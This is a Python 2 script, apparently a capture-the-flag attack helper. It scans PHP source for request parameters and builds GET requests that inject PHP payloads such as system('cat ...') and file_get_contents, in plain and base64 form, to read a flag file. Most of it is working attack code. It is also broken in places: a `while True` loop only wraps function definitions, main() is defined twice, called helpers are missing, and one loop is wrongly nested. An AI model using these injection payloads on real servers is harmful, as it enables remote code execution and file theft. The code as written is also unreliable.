while True:
    def get_all(root, arg):
        all = []
        result = os.walk(root)
        for path,d,filelist in result:
            for file in filelist:
                if file.endswith(".php"):
                    full_path = path + "/" + file
                    content = get_content(full_path)
                    all.append(("/" + file, find_arg(content, arg)))
        return all

    def main():
        root = "."
        print get_all(root, "_GET")
        print get_all(root, "_POST")
        print get_all(root, "_COOKIE")
    def get_fake_plain_payloads(flag_path):
        payloads = []
        payloads.append('system("cat %s");' % (flag_path))
        payloads.append('highlight_file("%s");' % (flag_path))
        payloads.append('echo file_get_contents("%s");' % (flag_path))
        payloads.append('var_dump(file_get_contents("%s"));' % (flag_path))
        payloads.append('print_r(file_get_contents("%s"));' % (flag_path))
        return payloads

    def get_fake_base64_payloads(flag_path):
        payloads = get_fake_plain_payloads(flag_path)
        return [payload.encode("base64").replace("\n","") for payload in payloads]

    def main():
        flag_path = "/home/web/flag/flag"
        print get_fake_plain_payloads(flag_path)
        print get_fake_base64_payloads(flag_path)

    def handle_get(url, root, flag_path):
        all_requests = []
        http_get = get_all(root, "_GET")
        plain_payloads = get_fake_plain_payloads(flag_path)
        base64_payloads = get_fake_base64_payloads(flag_path)
        for item in http_get:
            path = item[0]
            args = item[1]
            for arg in args:
                for payload in plain_payloads:
                    new_url = "%s%s?%s=%s" % (url, path[len("./"):], arg[len("$_GET['"):-len("']")], payload)
                    request = requests.Request("GET", new_url)
                    all_requests.append(request)
                    for payload in base64_payloads:
                        new_url = "%s%s?%s=%s" % (url, path[len("./"):], arg[len("$_GET['"):-len("']")], payload)
                        request = requests.Request("GET", new_url)
                        all_requests.append(request)
        return all_requests